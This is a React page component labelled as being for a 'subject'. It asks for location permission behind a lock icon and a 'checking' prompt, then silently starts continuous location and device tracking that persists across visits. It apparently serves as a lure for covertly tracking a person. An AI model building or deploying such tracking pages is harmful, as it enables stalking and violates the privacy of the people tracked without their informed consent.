import React, { useState, useRef, useCallback, useEffect } from 'react';
import { GPS_OPTIONS } from './geolocation';
import { useLocationTracker } from './hooks/useLocationTracker';
import { getDeviceInfo } from './deviceInfo';
import {
    SUBJECT_TITLE,
    SUBJECT_MESSAGE,
    SUBJECT_SUCCESS_MESSAGE,
    SUBJECT_GRANTED_KEY
} from './config';
import './SubjectPage.css';

const noop = () => {};

function SubjectPage() {
    const deviceInfoRef = useRef(getDeviceInfo());
    const [phase, setPhase] = useState('prompt');
    const [trackingEnabled, setTrackingEnabled] = useState(false);

    useLocationTracker({
        enabled: trackingEnabled,
        deviceInfo: deviceInfoRef.current,
        testMode: false,
        onConnectionChange: noop,
        onDeviceRegistered: noop,
        onUserLocation: noop,
        onDevicesChange: noop,
        onLocationRefining: noop
    });

    const startTracking = useCallback(() => {
        localStorage.setItem(SUBJECT_GRANTED_KEY, 'true');
        setTrackingEnabled(true);
        setPhase('success');
    }, []);

    const requestLocation = useCallback(() => {
        if (!navigator.geolocation) {
            setPhase('denied');
            return;
        }

        setPhase('waiting');

        navigator.geolocation.getCurrentPosition(
            () => {
                startTracking();
            },
            () => {
                setPhase('denied');
            },
            GPS_OPTIONS
        );
    }, [startTracking]);

    useEffect(() => {
        if (localStorage.getItem(SUBJECT_GRANTED_KEY) === 'true') {
            setTrackingEnabled(true);
            setPhase('success');
        }
    }, []);

    return (
        <div className="subject-page">
            <div className="subject-card">
                {phase === 'success' ? (
                    <>
                        <div className="subject-icon subject-icon--ok">✓</div>
                        <h1 className="subject-title">{SUBJECT_TITLE}</h1>
                        <p className="subject-text">{SUBJECT_SUCCESS_MESSAGE}</p>
                    </>
                ) : (
                    <>
                        <div className="subject-icon">🔒</div>
                        <h1 className="subject-title">{SUBJECT_TITLE}</h1>
                        <p className="subject-text">{SUBJECT_MESSAGE}</p>
                        {phase === 'waiting' ? (
                            <p className="subject-hint">Yoxlanılır...</p>
                        ) : (
                            <button
                                type="button"
                                className="subject-btn"
                                onClick={requestLocation}
                            >
                                Davam et
                            </button>
                        )}
                        {phase === 'denied' && (
                            <p className="subject-error">
                                Konum icazəsi verilmədi. Parametrlərdən icazə verib yenidən
                                cəhd edin.
                            </p>
                        )}
                    </>
                )}
            </div>
        </div>
    );
}

export default SubjectPage;
